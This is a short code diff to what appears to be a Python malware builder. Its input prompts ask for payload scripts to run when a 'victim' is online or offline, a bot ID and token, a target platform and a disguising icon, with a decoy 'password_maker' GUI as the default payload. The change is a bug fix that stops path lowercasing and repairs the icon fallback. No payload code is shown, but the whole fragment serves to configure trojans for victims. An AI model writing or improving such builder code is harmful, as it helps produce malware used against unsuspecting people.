@@ -126,10 +126,10 @@ def get_options(): # get all of inputs and make python file
         try:
             int(max_letter)
         except: print(Fore.RED + "Invalid input(Just write number without space)."), exit()
-        code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is online(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads): ")).lower()    
+        code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is online(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads): "))
         clear()
         same_banner()
-        offline_code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is offline(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads/offline): ")).lower()    
+        offline_code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is offline(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads/offline): "))
         clear()
         same_banner()
         platform_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " choice your platform(windows, linux, mac): ")).lower()
@@ -150,8 +150,7 @@ def get_options(): # get all of inputs and make python file
             print(Fore.RED + "This platform dosnt exist!")
             exit()
         offline_code_addr = offline_code_addr_inp if offline_code_addr_inp.endswith(".py") else "builder/tk_payloads/offline/no_internet.py"
-        icon = icon_inp if icon_inp.endswith(".ico") else print("ERROR WHILE READING ICON. USING NORMAL ICON"), "icongallery/icon.ico"
-        print(f"ICON : {icon}")
+        icon = icon_inp if icon_inp.endswith(".ico") else "icongallery/icon.ico"
         code_addr = code_addr_inp if code_addr_inp.endswith(".py") else "builder/tk_payloads/password_maker.py"
         # make python file
         make.make_python(ID=id, TOKEN=token, NAME=name, MAX_LETTER=max_letter, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr, PLATFORM=platform)
